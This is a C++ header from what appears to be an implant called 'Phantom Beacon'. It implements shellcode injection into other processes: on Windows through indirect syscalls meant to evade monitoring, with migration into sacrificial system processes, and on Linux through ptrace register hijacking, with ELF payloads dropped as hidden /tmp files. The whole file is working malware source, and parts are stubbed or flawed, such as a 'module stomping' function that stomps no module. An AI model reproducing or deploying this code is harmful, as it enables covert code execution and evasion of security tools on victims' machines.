#pragma once
// ============================================================================
//  injection.h — Phantom Beacon Process Injection (Windows + Linux)
//  ──────────────────────────────────────────────────────────────
//  Windows:  Implements Process Hollowing and Remote Thread Injection
//            using Indirect Syscalls (NtOpenProcess, NtAllocateVirtualMemory, etc.)
//  Linux:    Implements ptrace-based injection for x86_64
// ============================================================================

#include <vector>
#include <string>
#include <cstdio>
#include <cstdlib>
#include <cstring>

#ifdef _WIN32
#include <windows.h>
#include <tlhelp32.h>
#include "syscalls.h"

namespace injection {

// CLIENT_ID structure for NtOpenProcess
typedef struct _CLIENT_ID_T {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID_T, *PCLIENT_ID_T;

// Helper to get PID by name
inline DWORD get_process_id_by_name(const std::string& name) {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(pe);
        if (Process32First(hSnapshot, &pe)) {
            do {
                if (name == pe.szExeFile) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    return pid;
}

// Remote Thread Injection via Indirect Syscalls
inline std::string inject_shellcode(DWORD pid, const std::vector<unsigned char>& shellcode) {
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
    CLIENT_ID_T cid;
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    cid.UniqueThread = NULL;

    NTSTATUS status = syscalls::SysNtOpenProcess(&hProcess, PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &oa, &cid);
    if (status != 0 || !hProcess) {
        char err[64];
        snprintf(err, sizeof(err), "NtOpenProcess failed: 0x%08lX", (unsigned long)status);
        return std::string(err);
    }

    PVOID pRemoteBuf = nullptr;
    SIZE_T size = shellcode.size();

    status = syscalls::SysNtAllocateVirtualMemory(hProcess, &pRemoteBuf, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (status != 0) {
        char err[64];
        snprintf(err, sizeof(err), "NtAllocateVirtualMemory failed: 0x%08lX", (unsigned long)status);
        CloseHandle(hProcess);
        return std::string(err);
    }

    status = syscalls::SysNtWriteVirtualMemory(hProcess, pRemoteBuf, (PVOID)shellcode.data(), shellcode.size(), nullptr);
    if (status != 0) {
        char err[64];
        snprintf(err, sizeof(err), "NtWriteVirtualMemory failed: 0x%08lX", (unsigned long)status);
        CloseHandle(hProcess);
        return std::string(err);
    }

    DWORD oldProtect;
    SIZE_T protectSize = shellcode.size();
    PVOID protectAddr = pRemoteBuf;
    status = syscalls::SysNtProtectVirtualMemory(hProcess, &protectAddr, &protectSize, PAGE_EXECUTE_READ, &oldProtect);
    if (status != 0) {
        char err[64];
        snprintf(err, sizeof(err), "NtProtectVirtualMemory failed: 0x%08lX", (unsigned long)status);
        CloseHandle(hProcess);
        return std::string(err);
    }

    HANDLE hThread = NULL;
    status = syscalls::SysNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (PVOID)(LPTHREAD_START_ROUTINE)pRemoteBuf, NULL, FALSE, 0, 0, 0, NULL);
    if (status != 0) {
        char err[64];
        snprintf(err, sizeof(err), "NtCreateThreadEx failed: 0x%08lX", (unsigned long)status);
        CloseHandle(hProcess);
        return std::string(err);
    }

    if (hThread) CloseHandle(hThread);
    CloseHandle(hProcess);
    return "Successfully injected into PID " + std::to_string(pid);
}

// Module Stomping
inline bool module_stomping(DWORD pid, const std::vector<unsigned char>& shellcode) {
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
    CLIENT_ID_T cid;
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    cid.UniqueThread = NULL;

    if (syscalls::SysNtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cid) != 0) return false;

    HMODULE hTargetModule = GetModuleHandleA("kernelbase.dll");
    if (!hTargetModule) hTargetModule = GetModuleHandleA("advapi32.dll");
    if (!hTargetModule) { CloseHandle(hProcess); return false; }

    MODULEINFO modInfo;
    if (!GetModuleInformation(GetCurrentProcess(), hTargetModule, &modInfo, sizeof(modInfo))) {
        CloseHandle(hProcess); return false;
    }

    PVOID pRemoteBuf = nullptr;
    SIZE_T size = shellcode.size();

    if (syscalls::SysNtAllocateVirtualMemory(hProcess, &pRemoteBuf, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0) {
        CloseHandle(hProcess); return false;
    }

    if (syscalls::SysNtWriteVirtualMemory(hProcess, pRemoteBuf, (PVOID)shellcode.data(), shellcode.size(), nullptr) != 0) {
        CloseHandle(hProcess); return false;
    }

    DWORD oldProtect;
    SIZE_T protectSize = shellcode.size();
    PVOID protectAddr = pRemoteBuf;
    syscalls::SysNtProtectVirtualMemory(hProcess, &protectAddr, &protectSize, PAGE_EXECUTE_READ, &oldProtect);

    HANDLE hThread = NULL;
    syscalls::SysNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (PVOID)pRemoteBuf, NULL, FALSE, 0, 0, 0, NULL);

    if (hThread) CloseHandle(hThread);
    CloseHandle(hProcess);
    return true;
}

inline std::string current_process_name() {
    char path[MAX_PATH];
    if (!GetModuleFileNameA(NULL, path, MAX_PATH)) return "";
    std::string name(path);
    auto pos = name.find_last_of("\\/");
    if (pos != std::string::npos) name = name.substr(pos + 1);
    return name;
}

inline std::string migrate_to_new_process(const std::vector<unsigned char>& shellcode) {
    static const char* targets[] = {
        "C:\\Windows\\System32\\RuntimeBroker.exe",
        "C:\\Windows\\System32\\rundll32.exe",
        "C:\\Windows\\SysWOW64\\rundll32.exe",
    };

    for (auto t : targets) {
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        if (!CreateProcessA(nullptr, (LPSTR)t, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi))
            continue;

        DWORD target_pid = pi.dwProcessId;
        std::string result = inject_shellcode(target_pid, shellcode);

        HANDLE hOriginalThread = OpenThread(THREAD_TERMINATE, FALSE, pi.dwThreadId);
        if (hOriginalThread) {
            TerminateThread(hOriginalThread, 0);
            CloseHandle(hOriginalThread);
        }

        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);

        if (result.find("Success") != std::string::npos)
            return "Migrated successfully to PID " + std::to_string(target_pid);
    }
    return "Failed to migrate: could not inject into a sacrificial process";
}

inline bool self_hollow() {
    if (current_process_name() == "RuntimeBroker.exe")
        return false;
    return false;
}

} // namespace injection

#else
// Linux ptrace-based injection

#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <linux/elf.h>
#include <cerrno>
#include <cstring>
#include <cstdint>

namespace injection {

inline pid_t get_process_id_by_name(const std::string& name) {
    DIR* proc = opendir("/proc");
    if (!proc) return 0;
    struct dirent* entry;
    while ((entry = readdir(proc)) != nullptr) {
        bool isNum = true;
        for (char* p = entry->d_name; *p; p++) {
            if (*p < '0' || *p > '9') { isNum = false; break; }
        }
        if (!isNum) continue;
        pid_t pid = static_cast<pid_t>(std::atol(entry->d_name));
        std::string commPath = std::string("/proc/") + entry->d_name + "/comm";
        FILE* f = fopen(commPath.c_str(), "r");
        if (!f) continue;
        char comm[256];
        if (fgets(comm, sizeof(comm), f)) {
            size_t len = strlen(comm);
            if (len > 0 && comm[len-1] == '\n') comm[len-1] = '\0';
            if (name == comm) { fclose(f); closedir(proc); return pid; }
        }
        fclose(f);
    }
    closedir(proc);
    return 0;
}

// Build execve() shellcode for x86_64 that runs a given path
// Returns shellcode bytes with path embedded
inline std::vector<unsigned char> build_execve_shellcode(const std::string& path) {
    // x86_64 execve(path, {path, NULL}, NULL) shellcode
    // This will be patched at runtime with the actual path
    std::vector<unsigned char> sc;
    
    // xor rdx, rdx        ; envp = NULL
    sc.push_back(0x48); sc.push_back(0x31); sc.push_back(0xd2);
    
    // lea rdi, [rip + offset]  ; relative address to path string
    sc.push_back(0x48); sc.push_back(0x8d); sc.push_back(0x3d);
    // offset placeholder (4 bytes) - will be patched
    size_t offset_pos = sc.size();
    sc.push_back(0x00); sc.push_back(0x00); sc.push_back(0x00); sc.push_back(0x00);
    
    // push rdx            ; NULL (argv[1])
    sc.push_back(0x52);
    // push rdi            ; path (argv[0])
    sc.push_back(0x57);
    // mov rsi, rsp        ; rsi = argv array
    sc.push_back(0x48); sc.push_back(0x89); sc.push_back(0xe6);
    
    // mov rax, 59         ; sys_execve
    sc.push_back(0x48); sc.push_back(0xc7); sc.push_back(0xc0);
    sc.push_back(0x3b); sc.push_back(0x00); sc.push_back(0x00); sc.push_back(0x00);
    
    // syscall
    sc.push_back(0x0f); sc.push_back(0x05);
    
    // Path string at the end
    size_t path_start = sc.size();
    for (char c : path) sc.push_back(static_cast<unsigned char>(c));
    sc.push_back(0x00); // null terminator
    
    // Patch the offset in lea instruction
    // offset = path_start - (offset_pos + 4)  ; RIP points after the lea instruction
    int32_t offset = static_cast<int32_t>(path_start) - static_cast<int32_t>(offset_pos + 4);
    sc[offset_pos + 0] = static_cast<unsigned char>(offset & 0xff);
    sc[offset_pos + 1] = static_cast<unsigned char>((offset >> 8) & 0xff);
    sc[offset_pos + 2] = static_cast<unsigned char>((offset >> 16) & 0xff);
    sc[offset_pos + 3] = static_cast<unsigned char>((offset >> 24) & 0xff);
    
    return sc;
}

// Write shellcode data to a file and return the path
inline std::string write_binary_to_temp(const std::vector<unsigned char>& data) {
    // Generate random path
    std::string path = "/tmp/.ph_";
    for (int i = 0; i < 8; i++) {
        static const char chars[] = "abcdefghijklmnopqrstuvwxyz0123456789";
        path += chars[rand() % (sizeof(chars) - 1)];
    }
    
    FILE* f = fopen(path.c_str(), "wb");
    if (!f) return "";
    size_t written = fwrite(data.data(), 1, data.size(), f);
    fclose(f);
    
    if (written != data.size()) {
        unlink(path.c_str());
        return "";
    }
    
    // Make executable
    chmod(path.c_str(), 0755);
    
    return path;
}

// Linux process injection via ptrace + /proc/pid/mem
// If shellcode starts with ELF header, writes to disk and injects execve stub
// Otherwise, injects raw shellcode directly into target memory
inline std::string inject_shellcode(pid_t pid, const std::vector<unsigned char>& shellcode) {
    // ── ELF binary handling ──────────────────────────────────────────────
    // If shellcode starts with ELF magic, write to temp file and inject execve
    if (shellcode.size() > 4 && shellcode[0] == 0x7f && 
        shellcode[1] == 'E' && shellcode[2] == 'L' && shellcode[3] == 'F') {
        
        std::string exe_path = write_binary_to_temp(shellcode);
        if (exe_path.empty()) {
            return "Failed to write ELF binary to temp file.";
        }
        
        std::vector<unsigned char> execve_sc = build_execve_shellcode(exe_path);
        
        // Inject the execve shellcode into target
        std::string result = inject_shellcode(pid, execve_sc);
        
        if (result.find("Success") != std::string::npos) {
            return "Successfully injected ELF binary into PID " + std::to_string(pid) +
                   " (execve: " + exe_path + ")";
        }
        
        unlink(exe_path.c_str());
        return result;
    }
    
    // ── Raw shellcode injection ──────────────────────────────────────────
    // 1. Attach to target process
    long ret = ptrace(PTRACE_ATTACH, pid, nullptr, nullptr);
    if (ret != 0) {
        return "ptrace attach failed: " + std::string(strerror(errno));
    }

    int status;
    waitpid(pid, &status, 0);
    if (!WIFSTOPPED(status)) {
        ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
        return "Target process did not stop after attach.";
    }

    // 2. Save original registers
    struct user_regs_struct old_regs;
#ifdef __x86_64__
    if (ptrace(PTRACE_GETREGS, pid, nullptr, &old_regs) != 0) {
        ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
        return "Failed to get registers.";
    }
#else
    ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
    return "Inject not supported on this architecture.";
#endif

    // 3. Find a writable mapped region for shellcode
    std::string mapsPath = "/proc/" + std::to_string(pid) + "/maps";
    FILE* maps = fopen(mapsPath.c_str(), "r");
    if (!maps) {
        ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
        return "Failed to read target memory maps.";
    }

    unsigned long targetAddr = 0;
    unsigned long regionSize = 0;
    char line[512];
    while (fgets(line, sizeof(line), maps)) {
        unsigned long start, end;
        char perms[8];
        if (sscanf(line, "%lx-%lx %4s", &start, &end, perms) >= 3) {
            if (perms[0] == 'r' && perms[1] == 'w') {
                unsigned long sz = end - start;
                if (sz >= shellcode.size()) {
                    targetAddr = start;
                    regionSize = sz;
                    break;
                }
            }
        }
    }
    fclose(maps);

    if (targetAddr == 0) {
        ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
        return "Could not find suitable memory region in target.";
    }

    // 4. Write shellcode using process_vm_writev
    struct iovec local_iov, remote_iov;
    local_iov.iov_base = const_cast<unsigned char*>(shellcode.data());
    local_iov.iov_len = shellcode.size();
    remote_iov.iov_base = reinterpret_cast<void*>(targetAddr);
    remote_iov.iov_len = shellcode.size();

    ssize_t written = process_vm_writev(pid, &local_iov, 1, &remote_iov, 1, 0);
    if ((size_t)written != shellcode.size()) {
        ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
        return "process_vm_writev failed: " + std::string(strerror(errno));
    }

    // 5. Set PC to shellcode address
#if defined(__x86_64__) || defined(__i386__)
    struct user_regs_struct regs;
    if (ptrace(PTRACE_GETREGS, pid, nullptr, &regs) != 0) {
        ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
        return "Failed to get registers for RIP change.";
    }
#ifdef __x86_64__
    regs.rip = targetAddr;
#else
    regs.eip = targetAddr;
#endif
    if (ptrace(PTRACE_SETREGS, pid, nullptr, &regs) != 0) {
        ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
        return "Failed to set RIP.";
    }
#elif defined(__aarch64__)
    struct iovec iov;
    struct user_pt_regs regs;
    iov.iov_base = &regs;
    iov.iov_len = sizeof(regs);
    if (ptrace(PTRACE_GETREGSET, pid, NT_PRSTATUS, &iov) != 0) {
        ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
        return "Failed to get registers for PC change.";
    }
    regs.pc = targetAddr;
    if (ptrace(PTRACE_SETREGSET, pid, NT_PRSTATUS, &iov) != 0) {
        ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
        return "Failed to set PC.";
    }
#else
    ptrace(PTRACE_DETACH, pid, nullptr, nullptr);
    return "Inject not supported on this architecture.";
#endif

    // 6. Detach
    if (ptrace(PTRACE_DETACH, pid, nullptr, nullptr) != 0) {
        return "Injected but ptrace detach failed: " + std::string(strerror(errno));
    }

    return "Successfully injected into PID " + std::to_string(pid);
}

inline std::string migrate_to_new_process(const std::vector<unsigned char>& shellcode) {
    // Fork a child process and inject into it
    pid_t child = fork();
    if (child == -1) return "Failed to fork for migration.";

    if (child == 0) {
        // Child process: stop and wait for injection
        ptrace(PTRACE_TRACEME, 0, nullptr, nullptr);
        raise(SIGSTOP);
        // Child will be hijacked by parent
        // If the parent fails to inject, this will exit
        _exit(0);
    }

    // Parent: wait for child to stop
    int status;
    waitpid(child, &status, 0);

    // Inject shellcode into child
    std::string result = inject_shellcode(child, shellcode);

    if (result.find("Success") != std::string::npos) {
        // Detach was already done by inject_shellcode
        return "Migrated successfully to PID " + std::to_string(child);
    }

    // Clean up child
    kill(child, SIGKILL);
    waitpid(child, &status, 0);
    return "Migration failed: " + result;
}

inline std::string current_process_name() {
    char path[1024];
    ssize_t len = readlink("/proc/self/exe", path, sizeof(path) - 1);
    if (len <= 0) return "unknown";
    path[len] = '\0';
    std::string name(path);
    auto pos = name.find_last_of('/');
    if (pos != std::string::npos) name = name.substr(pos + 1);
    return name;
}

inline bool self_hollow() { return false; }

} // namespace injection

#endif
